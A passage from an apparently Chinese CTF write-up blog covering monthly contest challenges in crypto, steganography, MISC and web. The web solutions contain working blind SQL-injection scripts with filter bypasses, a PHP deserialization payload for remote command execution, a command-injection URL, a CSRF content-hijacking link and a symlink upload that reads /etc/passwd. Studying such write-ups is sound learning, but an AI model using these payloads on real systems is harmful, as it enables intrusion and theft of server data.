class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">"flag&#123;"</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">"&#125;"</span></span><br></pre></td></tr></table></div></figure><p>观察可知本体的e非常大，所以百度搜索 <code>rsa攻击e很大</code>  在第一条结果里面居然就找到思路！！本题是wiener-attack，还附上了github代码，直接copy下来用就可以了，可以得到d的值，代入上述代码中即可得到flag</p>        <h3 id="洞拐洞拐洞洞拐">          <a href="#洞拐洞拐洞洞拐" class="heading-link"><i class="fas fa-link"></i></a>洞拐洞拐洞洞拐</h3>      <p>打开图片放大观察发现每一个小像素都是或黑或白的小方块,所以可以把黑色看成1白色看成0转换一下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'5aff787f5d6f2.png'</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">        r,g,b = pix[x,y]</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">255</span>:</span><br><span class="line">            flag += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="string">'1'</span></span><br><span class="line">content = re.findall(<span class="string">r'.&#123;8&#125;'</span>,flag)</span><br><span class="line">nflag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> content:</span><br><span class="line">    nflag += chr(int(item,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag = base64.b16decode(nflag)</span><br><span class="line">open(<span class="string">'1.wav'</span>,<span class="string">'wb'</span>).write(flag)</span><br></pre></td></tr></table></div></figure><p>处理wav文件，可以用一个Audacity工具，网上有在线版，分析文件，发现文件波形长度应该是八进制文件，分析一下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="string">'1.wav'</span></span><br><span class="line">wavefile = wave.open(file,<span class="string">'r'</span>)</span><br><span class="line">numframes = wavefile.getnframes()</span><br><span class="line">strdata = wavefile.readframes(numframes)</span><br><span class="line">wavedata = np.fromstring(strdata,dtype=np.int16)</span><br><span class="line">wavedata = wavedata * <span class="number">1.0</span> / (max(abs(wavedata)))</span><br><span class="line">datas = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(wavedata),<span class="number">10</span>):</span><br><span class="line">    datas.append(wavedata[i])</span><br><span class="line"></span><br><span class="line">strs = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">    x = <span class="string">"%0.2f"</span> % data</span><br><span class="line">    strs += str(int((float(x) + <span class="number">1.0</span>)/<span class="number">0.25</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">tt = re.findall(<span class="string">r'.&#123;3&#125;'</span>,strs)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tt:</span><br><span class="line">    flag += chr(int(t,<span class="number">8</span>))</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> base64.b32decode(flag+<span class="string">"======"</span>)</span><br></pre></td></tr></table></div></figure><p>处理一下就可以得到flag，这题真的是头铁，还是我太菜了。。</p>        <h1 id="7月月赛">          <a href="#7月月赛" class="heading-link"><i class="fas fa-link"></i></a>7月月赛</h1>              <h2 id="web">          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a>web</h2>              <h3 id="web02-就是这么直接">          <a href="#web02-就是这么直接" class="heading-link"><i class="fas fa-link"></i></a>web02 就是这么直接</h3>      <p>这题目我觉得就是脑洞题，题目给出了提示代码，其中有md5函数，可能是提示我们本题和md5有关，其实本题思路就是先提交一个md5值，题目会返回 <code>emmm我觉得答案是啥呢？</code> 查看元素可以看到后面还加了一串md5值，将这段md5再次提交，重复这个过程，直到得到flag，代码如下：</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =  <span class="string">'http://101.71.29.5:10002/flag.php'</span></span><br><span class="line">payload = &#123;<span class="string">'answer'</span>:<span class="string">'c36af63f87acebba1c23498809db7537'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    content = requests.post(url,payload).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</span><br><span class="line">        print(content)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    new = re.findall(<span class="string">'&lt;!--[0-9a-z]&#123;10,&#125;--&gt;'</span>,content)</span><br><span class="line">    payload = &#123;<span class="string">'answer'</span>: new[<span class="number">0</span>][<span class="number">4</span>:<span class="number">-3</span>]&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="web03-简历来了">          <a href="#web03-简历来了" class="heading-link"><i class="fas fa-link"></i></a>web03 简历来了</h3>      <p>这个题目考察的是CSRF相关的知识点</p><p>/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg<br><span class="exturl"><a class="exturl__link" href="http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1">http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="MISC">          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>      <p>链接：<span class="exturl"><a class="exturl__link" href="https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg" target="_blank" rel="noopener">https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   密码：m97g</p>        <h3 id="0x01-弱口令">          <a href="#0x01-弱口令" class="heading-link"><i class="fas fa-link"></i></a>0x01-弱口令</h3>      <p>这题比较坑，题目是个压缩包，解压需要密码，打开压缩包之后发现有一段不可见文本，复制一下在sublime中打开发现是摩斯密码，解密一下 <code>HELL0FORUM</code> ，解压这个压缩包，发现一张图片，一道基本的LSB色道隐写，用脚本跑一下即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract aa.png 1.txt 123456</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><figcaption><span>是弱口令</span></figcaption><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0X02-浏览图片的时候刷新键有没有用呢 </span><br><span class="line"></span><br><span class="line">由刷新可以联想到这题考察的是F5算法，网上查找解密算法</span><br></pre></td></tr></table></div></figure><p>java Extract Misc.jpg<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以得到一个文本文件，看文件前缀发现是zip文件前缀，修改文件后缀为zip即可，zip文件还有一层伪加密，之后解密即可得到flag</span><br><span class="line"></span><br><span class="line">### 0x03-到底为了什么</span><br></pre></td></tr></table></div></figure><br>http.request.uri contains “pma”<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[](month_race&#x2F;1.png)</span><br><span class="line"></span><br><span class="line">可以看到有一条修改密码的命令，继续浏览发现应该是一个csrf攻击的流量包，网上查找cve编号</span><br><span class="line"></span><br><span class="line">[](month_race&#x2F;2.png)</span><br><span class="line"></span><br><span class="line">计算flag</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">$con &#x3D; strtolower(&quot;CVE-2017-1000499_CWE-352_2018-06-15 09:40:12&quot;);</span><br><span class="line">echo md5($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure></p>        <h1 id="十月月赛">          <a href="#十月月赛" class="heading-link"><i class="fas fa-link"></i></a>十月月赛</h1>              <h2 id="web-1">          <a href="#web-1" class="heading-link"><i class="fas fa-link"></i></a>web</h2>              <h3 id="好黑的黑名单">          <a href="#好黑的黑名单" class="heading-link"><i class="fas fa-link"></i></a>好黑的黑名单</h3>      <p>随便测试可以发现数据库名长度为3</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;0||if((length(database())-3),1,0)</span><br></pre></td></tr></table></div></figure><p>题目过滤了分号，单引号，但是regexp没有被过滤，可以使用regexp来绕过，可知数据库名为web</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;if((database()regexp(0x776562)),1,2)</span><br></pre></td></tr></table></div></figure><p>然后爆库名，但是=号被过滤了，但是可以用in来绕过，比如这样</p><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></div></figure><p>空格也被过滤了，可以用%0a绕过，还有information.schema.tables也被过滤了，可以用information_schema%0a.%0atables来绕过，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10008/show.php?id="</span></span><br><span class="line">test = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm,\&#123;|\&#125;~"</span></span><br><span class="line">table = <span class="string">"if(((select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.%0atables%0awhere%0atable_schema%0ain%0a(database()))regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line"><span class="comment"># table_name:admin,flaggg,menu</span></span><br><span class="line">column = <span class="string">"if(((select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.%0acolumns%0awhere%0atable_name%0ain%0a(0x666c61676767))regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line"><span class="comment"># id,f1agg</span></span><br><span class="line">content = <span class="string">"if(((select%0af1agg%0afrom%0aflaggg)regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line">payload = <span class="string">"5e"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">flagdic = <span class="string">"0123456789abcdeflag."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> flagdic:</span><br><span class="line">        temp = hex(ord(s))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># print(url+table.format(payload+temp))</span></span><br><span class="line">        res = requests.get(url+content.format(payload+temp)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"郑州烩面"</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">if</span> temp == <span class="string">"7b"</span>:</span><br><span class="line">                payload += <span class="string">"2e"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += temp;</span><br><span class="line">            flag += chr(int(temp,<span class="number">16</span>))</span><br><span class="line">            print(payload)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"油泼面"</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error"</span>)</span><br></pre></td></tr></table></div></figure><p>看了学长的博客说regexp在匹配flag的时候只能到flag{之后就会报错，这是由于正则表达式中{}是有特殊含义的，所以会报错，我们用 <code>.</code> 来代替{}就可以了</p><p><img src="/2020/09/13/month-race/10.png" alt></p>        <h3 id="ezsql">          <a href="#ezsql" class="heading-link"><i class="fas fa-link"></i></a>ezsql</h3>      <p>注入题目，注册账号登录进去查看用户信息时id参数存在注入，需要用到load_file函数，wp里面用了if函数，但是这题我使用的异或运算符^</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10015/user/user.php?id="</span></span><br><span class="line">file = open(<span class="string">'1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"8lvl1ukppvqs2ovi8n0a2lu4g5"</span>&#125;</span><br><span class="line"><span class="comment"># index.php</span></span><br><span class="line">index = <span class="string">"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x&#123;&#125;25)"</span> </span><br><span class="line">config = <span class="string">"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672f636f6e6669672e706870)) like 0x&#123;&#125;25)"</span> </span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">content = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> dic:</span><br><span class="line">        temp = hex(ord(item))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># print(url+index.format(payload+temp))</span></span><br><span class="line">        res = requests.get(url+config.format(payload+temp),cookies=cookie).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> res:</span><br><span class="line">            payload += temp</span><br><span class="line">            content += item</span><br><span class="line">            file.writelines(payload)</span><br><span class="line">            file.writelines(content)</span><br><span class="line">            print(payload)</span><br><span class="line">            print(content)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><p>可以得到index.php的代码为</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>再读config.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];    </span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="comment">//        echo $value;</span></span><br><span class="line">        $value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">            $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>可以看到在__get()函数，该函数是类在访问私有成员的时候会自动调用这个方法，具体机制还需要研究，然后这里与setfilter函数利用反序列化可以构成rce，在cookie中写入序列化值</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$snow = <span class="keyword">new</span> Config();</span><br><span class="line">$snow-&gt;filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($snow));</span><br></pre></td></tr></table></div></figure><p>然后访问</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;ls</span><br></pre></td></tr></table></div></figure><p>发现即可列目录，但是由于过滤了空格和/，所以无法读文件，空格可以使用$IFS绕过，然后利用grep命令来读</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;grep$IFS-ri$IFS.$IFSflag</span><br></pre></td></tr></table></div></figure><p>这个不理解，需要后续再学习</p><p>在附上官方解法，待研究</p><p><img src="/2020/09/13/month-race/11.png" alt></p>        <h3 id="interesting-web">          <a href="#interesting-web" class="heading-link"><i class="fas fa-link"></i></a>interesting web</h3>      <p>题目是一个flask框架，题目了修改密码功能，思路是修改admin的密码，flask框架中session<br>是存储在浏览器端的，虽然不能伪造但是可以破解，我们</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaamRrWlRaa1l6QmlZVEV4TlRVMU5UWTVaVFV3Wmpaak16ZGxNVFU1TURVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DuKTNg.LtfGK8IX-4fJ6WO-6mcVJsU2hdI</span><br></pre></td></tr></table></div></figure><p>第一个.号之前的内容是base64编码的，直接解密就可以了</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;login&quot;:true,&quot;token&quot;:&#123;&quot; b&quot;:&quot;ZjdkZTZkYzBiYTExNTU1NTY5ZTUwZjZjMzdlMTU5MDU&#x3D;&quot;&#125;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></div></figure><p>再将b的值base64解码就可以得到token了，然后修改密码，以admin身份登录，然后利用软链接来读取文件</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 1.jpg</span><br><span class="line">tar cvfp shell.tat 1.jpg</span><br></pre></td></tr></table></div></figure><p>然后上传在访问图片，下载之，修改后缀为txt查看即可得到flag</p>        <h2 id="Crypt">          <a href="#Crypt" class="heading-link"><i class="fas fa-link"></i></a>Crypt</h2>              <h3 id="仿射">          <a href="#仿射" class="heading-link"><i class="fas fa-link"></i></a>仿射</h3>      <p>仿射密码，题目已经给出了b的值，对于仿射密码来说</p><p>加密过程为</p><blockquote><p>y≡e(x)≡a(x)+b(mod26)</p></blockquote><p>解密过程</p><blockquote><p>x ≡ d(e(x)) ≡ a’(e(x)-b)(mod26)         # a’为a的逆，在26以内是有限的</p></blockquote><p>我们只需要爆破即可</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">"achjbnpdfherebjsw"</span></span><br><span class="line">b=<span class="number">7</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> c:</span><br><span class="line">        seq = (i*((ord(s)-ord(<span class="string">'a'</span>))-b)) % <span class="number">26</span></span><br><span class="line">        flag += chr(ord(<span class="string">'a'</span>)+seq)</span><br><span class="line">    print(flag)</span><br><span class="line">    flag = <span class="string">""</span></span><br></pre></td></tr></table></div></figure><p>然后即可找到flag</p><p><img src="/2020/09/13/month-race/12.png" alt></p><!-- youareright -->        <h2 id="MISC-1">          <a href="#MISC-1" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>              <h3 id="MISC1">          <a href="#MISC1" class="heading-link"><i class="fas fa-link"></i></a>MISC1</h3>      <p>题目如下</p><blockquote><p>中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？</p><p>（企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶）</p></blockquote><p>这是一种数字密码表，好像叫110数字记忆表，是帮助提高记忆力的</p><p>直接网上找对应的值然后脚本，获取数字之后，每个数字的加30取ascii码值就是flag</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = (<span class="string">"企鹅"</span>,<span class="string">"青蛙"</span>,<span class="string">"油漆"</span>,<span class="string">"花旗参"</span>,<span class="string">"救生圈"</span>,<span class="string">"油漆"</span>,<span 